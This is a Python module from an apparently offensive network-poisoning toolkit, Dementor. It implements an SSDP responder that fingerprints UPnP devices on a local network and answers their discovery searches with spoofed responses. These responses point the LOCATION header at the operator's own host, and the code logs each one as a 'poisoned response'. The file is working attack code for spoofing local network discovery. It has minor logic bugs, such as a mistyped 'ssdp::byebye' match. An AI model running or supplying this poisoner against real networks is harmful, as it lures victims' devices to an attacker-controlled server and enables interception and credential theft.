# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# References:
#   - [UPnPARCH] https://openconnectivity.org/upnp-specs/UPnP-arch-DeviceArchitecture-v2.0-20200417.pdf
import email.message
import email.parser
import io

import http.client
import socket

from rich.markup import escape
from rich.text import Text

from dementor.servers import (
    ThreadingUDPServer,
    ServerThread,
    BaseProtoHandler,
    add_mcast_membership,
)
from dementor.config.toml import TomlConfig, Attribute as A
from dementor.logger import ProtocolLogger
from dementor.filters import ATTR_BLACKLIST, ATTR_WHITELIST, in_scope


def apply_config(session):
    session.ssdp_config = TomlConfig.build_config(SSDPConfig)


def create_server_threads(session):
    return (
        [ServerThread(session, SSDPServer, server_address=(session.bind_address, 1900))]
        if session.ssdp_enabled
        else []
    )


DEFAULT_SERVER = "OS/1.0 UPnP/1.0 Dementor/1.0"
DEFAULT_EXTR_HEADERS = [
    # The BOOTID.UPNP.ORG header field represents the boot instance of
    # the device expressed according to a monotonically increasing value
    "BOOTID.UPNP.ORG: 1",
    # The CONFIGID.UPNP.ORG field value shall be a non-negative, 31-bit integer that shall
    # represent the configuration number of a root device
    "CONFIGID.UPNP.ORG: 1337",
    'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01',
    "01-NLS: 1",
]


class SSDPConfig(TomlConfig):
    _section_ = "SSDP"
    _fields_ = [
        A("ssdp_location", "Location", None),
        A("ssdp_server", "Server", DEFAULT_SERVER),
        A("ssdp_extra_headers", "ExtraHeaders", DEFAULT_EXTR_HEADERS),
        A("ssdp_max_age", "MaxAge", 1800),
        ATTR_WHITELIST,
        ATTR_BLACKLIST,
    ]


# --- Protocol implementation ---


# [1.1 SSDP message format]
class SSDPMessage(email.message.Message):
    # 1.1.2 SSDP message header fields
    # Each message header field consist of a case-insensitive field
    # name followed by a colon (":"), followed by the case-sensitive
    # field value
    pass


SSDP_ADVERTISEMENT_START = b"NOTIFY * HTTP/1.1"
SSDP_SEARCH_START = b"M-SEARCH * HTTP/1.1"
SSDP_OK_H = b"HTTP/1.1 200 OK"

_SSDP_IPv4_mcast_addr = "239.255.255.250"
_SSDP_IPv6_mcast_addr = "FF02::C"


# [2.3 Device description]
# <UDN>
# Required. Unique Device Name. Universally-unique identifier for the device, whether root or
# embedded.
class UDN:
    def __init__(self, udn: str) -> None:
        self.tokens = udn.split(":")

    # Shall begin with “uuid:” followed by a UUID suffix specified by a UPnP vendor.
    @property
    def udn_uuid(self) -> str:
        return self.tokens[1]

    # [Table 1-1 — Root device discovery messages]
    # uuid:device-UUID::upnp:rootdevice
    # or
    # uuid:device-UUID
    def is_root_device(self) -> bool:
        return len(self.tokens) == 2 or self.tokens[-1] == "rootdevice"

    # Complete representation:
    # uuid:device-UUID::urn:schemas-upnp-org:device:deviceType:ver (of root device)
    # or
    # uuid:device-UUID::urn:domain-name:device:deviceType:ver
    @property
    def domain_name(self) -> str | None:
        return self.tokens[4] if len(self.tokens) >= 5 else None

    # uuid:device-UUID::urn:domain-name:device:deviceType:ver
    #                                   ^^^^^^
    def is_device(self) -> bool:
        return len(self.tokens) >= 6 and self.tokens[5] == "device"

    @property
    def device_type(self) -> str | None:
        return self.tokens[6] if len(self.tokens) >= 7 else None

    @property
    def version(self) -> str | None:
        return self.tokens[7] if len(self.tokens) >= 8 else None


class SSDPPoisoner(BaseProtoHandler):
    def __init__(self, config, request, client_address, server) -> None:
        self.message = None
        self.cmd = None
        super().__init__(config, request, client_address, server)

    @property
    def ssdp_config(self):
        return self.config.ssdp_config

    @property
    def upnp_config(self):
        return self.config.upnp_config

    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "SSDP",
                "protocol_color": "cornflower_blue",
                "host": self.client_host,
                "port": 1900,
            }
        )

    def should_respond(self) -> bool:
        # whitelist and blacklist targets are a bit different here:
        #  1. Host will be in scope if ST (SearchTarget) is in scope
        #  2. Default blacklist and whitelist rules apply from hereon
        if in_scope(self.message["ST"], self.config.ssdp_config):
            return True

        return in_scope(self.client_host, self.config.ssdp_config)

    def parse_request(self, data) -> None:
        stream = io.BytesIO(data)
        # REVISIT: logging
        # self.logger.debug(f"SSDP request: {data.hex()}", is_client=True)

        # 1.1.1 SSDP Start-line
        # ach SSDP message shall have exactly one start-line
        self.cmd = stream.readline(65535).strip()
        if not self.cmd:
            return

        # 1.1.2 SSDP message header fields
        self.message = http.client.parse_headers(stream, SSDPMessage)

        # [...]
        # SSDP messages should not have a message body. If a SSDP message
        # is received with a message body, the message body is allowed to
        # be ignored.

    def handle_data(self, data, transport) -> None:
        self.parse_request(data)
        self.logger.debug(f"SSDP request: {data!r}", is_client=True)
        if self.cmd == SSDP_ADVERTISEMENT_START:
            return self.handle_advertisement()

        if self.cmd == SSDP_SEARCH_START:
            return self.handle_search(transport)

    # [1.2 Advertisement]
    def handle_advertisement(self):
        # All NOTIFY messages MUST store the NTS (notification subtype)
        match self.message["NTS"]:
            # [1.2.2 Device available - NOTIFY with ssdp:alive]
            case "ssdp:alive":
                # USN
                #   Required. Field value contains Unique Service Name. Identifies a unique
                #   instance of a device or service
                usn = UDN(self.message["USN"] or "uuid:<invalid>")
                self.logger.display(
                    f"(Notify: [i]alive[/i]) {self.describe_device(usn)}"
                )

            # [1.2.3 Device unavailable -- NOTIFY with ssdp:byebye]
            case "ssdp::byebye":
                usn = UDN(self.message["USN"] or "uuid:<invalid>")
                self.logger.display(
                    f"(Notify: [i]byebye[/i]) {self.describe_device(usn)}"
                )

            # REVISIT: shoul we report ssdp:update?

    # [1.3.2 Search request with M-SEARCH]
    def handle_search(self, transport):
        target = self.message["ST"] or "uuid:invalid"
        target_text = ""
        search_tyoe = ""
        match target:
            # Search for all devices and services.
            case "ssdp:all":
                search_tyoe = "*"
            # Search for root devices only.
            case "upnp:rootdevice":
                search_tyoe = "root device"
            case _:
                tokens = target.split(":")
                # uuid:device-UUID
                #   Search for a particular device.
                if len(tokens) == 2:
                    search_tyoe = "UUID"
                    target_text = f"[i]{escape(tokens[1])}[/i]"
                elif len(tokens) >= 3:
                    search_tyoe = escape(tokens[2])
                    target_text = (
                        f"[i]{escape(tokens[1])}[/i]/[b]{escape(tokens[3])}[/b]"
                    )
                else:
                    search_tyoe = "service/device"

        try:
            mx = int(self.message["MX"] or 0)
        except ValueError:
            mx = 0

        self.logger.display(
            f"(Search: {search_tyoe}) {target_text or '<root>'} MX={mx}"
        )
        if not self.should_respond() or self.config.analysis:
            return  # DO NOT RESPOND

        # 1.3.3 Search response
        # USN
        #   Required. Field value contains Unique Service Name. Identifies a unique
        #   instance of a device or service
        #
        #   NOTE: We will use "uuid:device-UUID" for "ssdp:all" requests.
        # REVISIT: uncomment the next line to create thousands of new devices in
        # the explorer
        # service_uuid = str(uuid.uuid4())
        service_uuid = self.upnp_config.upnp_uuid
        usn = f"uuid:{service_uuid}"
        if target.startswith("uuid:"):
            # Edge case: we must respond with a different UUID
            usn = target
            service_uuid = target
        elif target != "ssdp:all":
            usn = f"{usn}::{target}"

        location = self.ssdp_config.ssdp_location
        if not location:
            host = str(self.message["HOST"]).lower()
            host_addr = self.config.ipv4
            port = self.upnp_config.upnp_port
            if "ff02::" in host: # IPv6 prefix
                if not self.config.ipv6:
                    self.logger.highlight(
                        "Client requested IPv6 address but local config does not "
                        "specify IPv6 address. Falling back to IPv4..."
                    )
                else:
                    host_addr = f"[{self.config.ipv6}]"
            else:
                if not self.config.ipv4:
                    self.logger.highlight(
                        "Client requested IPv4 address but local config does not "
                        "specify IPv4 address. Falling back to IPv6..."
                    )
                    host_addr = f"[{self.config.ipv6}]"

            path = self.upnp_config.upnp_dd_path or "dd.xml"
            path = path.lstrip("/")
            # This allows us to insert the right UUID into the XML document
            location = f"http://{host_addr}:{port}/{service_uuid}/{path}"

        # required headers
        header_buffer = [
            SSDP_OK_H.decode(),
            # CACHE-CONTROL
            #   Required. Field value shall have the max-age directive (“max-age=”) followed by
            #   an integer that specifies the number of seconds the advertisement is valid.
            f"CACHE-CONTROL: max-age={self.ssdp_config.ssdp_max_age}",
            # EXT
            #   Required for backwards compatibility with UPnP 1.0. (Header field name only; no
            #   field value.)
            "EXT:",
            # LOCATION
            #   Required. Field value contains a URL to the UPnP description of the root device.
            f"LOCATION: {location}",
            # SERVER
            #   Required. Specified by UPnP vendor. String.
            f"SERVER: {self.ssdp_config.ssdp_server}",
            # ST
            #   Required. Field value contains Search Target
            f"ST: {target}",
            f"USN: {usn}",
        ]
        header_buffer.extend(self.ssdp_config.ssdp_extra_headers)
        header_buffer.append("\r\n")

        buffer = "\r\n".join(header_buffer)
        self.logger.debug(f"Search Response: {buffer!r}", is_server=True)
        transport.sendto(buffer.encode(), self.client_address)
        self.logger.success(
            f"Sent poisoned response to {self.client_host} for {target_text or search_tyoe}"
        )

    def describe_server(self, server: str) -> tuple:
        os_name = product_name = ""
        if "UPnP/" in server:
            os_name, _, product_name = server.partition("UPnP/")
            os_name = os_name.strip()
            product_name = product_name.split(" ", 1)[1].strip()

        return (server, os_name.rstrip(","), product_name)

    def describe_device(self, udn: UDN, debug=True) -> str:
        text = ""
        server, os_name, _ = self.describe_server(self.message["SERVER"] or "")
        dtext = f"({escape(udn.udn_uuid)})"
        if os_name:
            text = f"(OS: {escape(os_name)})"
        dtext = f"{dtext} running with {escape(server)}"

        if udn.is_root_device():
            dtext = f"(root device) {dtext}"
            text = f"([b]root device[/b]) {text}"
        else:
            product = escape(udn.device_type or "")
            version = escape(udn.version or "")
            display_text = "Device: " if udn.is_device() else "Service: "
            if product:
                display_text = f"{display_text}[b]{product}[/b]"
                if version:
                    display_text = f"{display_text} (Version: [white]{version}[/white])"

            text = f"{display_text} {text}"
            dtext = f"{Text(display_text).plain} {dtext}"
        if debug:
            self.logger.debug(dtext, is_client=True)
        return text


class SSDPServer(ThreadingUDPServer):
    default_port = 1900
    default_handler_class = SSDPPoisoner
    service_name = "SSDP"

    def server_bind(self) -> None:
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        add_mcast_membership(
            self.socket,
            self.config,
            group4=_SSDP_IPv4_mcast_addr,
            group6=_SSDP_IPv6_mcast_addr,
        )
        super().server_bind()
